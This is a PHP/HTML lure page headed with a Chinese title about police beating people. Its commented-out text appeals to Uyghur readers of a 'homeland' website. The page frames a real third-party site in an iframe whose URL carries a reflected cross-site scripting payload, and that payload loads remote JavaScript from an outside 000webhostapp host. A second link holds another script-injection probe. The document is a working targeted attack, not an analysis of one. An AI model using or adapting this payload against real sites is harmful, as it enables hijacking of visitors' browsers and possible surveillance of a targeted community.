<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2018/1/26
 * Time: 10:39
 */

$targetURL="http://www.hoylam.net/page/2/?s=1%22/%3E%3CScRiPt%20%3Evar%20h=document.getElementsByTagName(%22head%22)[0];var%20t=new%20Date();t=t.getTime();var%20s=document.createElement(%22script%22);s.type=%22text/javascript%22;s.charset=%22utf-8%22;s.src=%22https://colorwolf2017.000webhostapp.com/webroot_mycakephp/zfirst/js/a.js?t=%22%2bt;h.appendChild(s);%3C/ScRiPt%3E%3Cinput%20value=%22";
//$targetURL="https://www.baidu.com/";
?>
<html>
<head>
    <meta charset="UTF-8">
    <title>非常气愤，警察打人</title>
    <style type="text/css">
        p
        {
            text-align:right;
        }
        .divRight
        {
            text-align:right;
        }
    </style>
</head>
<body style="text-align:center;">
    <iframe src="<?=$targetURL?>" width="100%" height="50%">
    </iframe>
    <div style="margin:0 auto;background-color:#aaaaaa;width:50%;direction:rtl;">
        <div class="divRight">
            <a target="_blank" href="http://uyghur.000webhostapp.com/">返回主页</a>
            <a target="_blank" href="http://www.hoylam.net/page/2/?s=1%22/%3E%3Cscript%20src=data:,alert(1)%3C!--">另一个</a>
        </div>
        <h1>test1</h1>
        <!--
        <h1>警察打人</h1>
        <p>前几天，我在乌鲁木齐的大街上走，看到这样一幕，我们的同胞正在被殴打，我感到十分的气愤，我希望家园网的同胞们能够利用你们的网站的影响力，把这一幕公布出去，让更多的人知道。</p>
        <p>详细的经过是我乘坐公交车经过大西门时，我们的同胞由于抓饭经营的比较好，挣得钱也比较多，警察就以资恐的名义，将我们的同胞抓起来了，并且将抓饭店查封。</p>
        <p>
            دوڭچيۇدى تورى خەۋىرى، نۇر تورى تەرجىمىسى:
        </p>
        <p>
            2-ئاينىڭ 6-كۈنى كەچ ئۈرۈمچى ۋاقتى 11:30دا ئۆتكۈزۈلگەن بىر مەيدان گېرمانىيە لوڭقىسى چارەك ھەل قىلغۇچ مۇسابىقىسىدە، بايرېن ميۇنخېن مېھمان مەيداندا پادېربورن كوماندىسى بىلەن مۇسابىقىلەشتى. ئالدىنقى يېرىم مەيدان مۇسابىقىدە بايرېن ميۇنخېن 0:3 نەتىجىدە ئۈستۈنلۈكنى ئىگىلىدى؛ كېيىنكى يېرىم مەيداندا بايرېن كوماندىسى يەنە ئارقا-ئارقىدىن ئۈچ توپ كىرگۈزۈپ، ئاخىرىدا 0:6 نەتىجىدە رەقىبىنى شاللاپ گېرمانىيە لوڭقىسى يېرىم ھەل قىلغۇچ باسقۇچىغا قەدەم قويدى.</p>
        <img src="img/img1.jpg"/>
        -->
    </div>
</body>
</html>
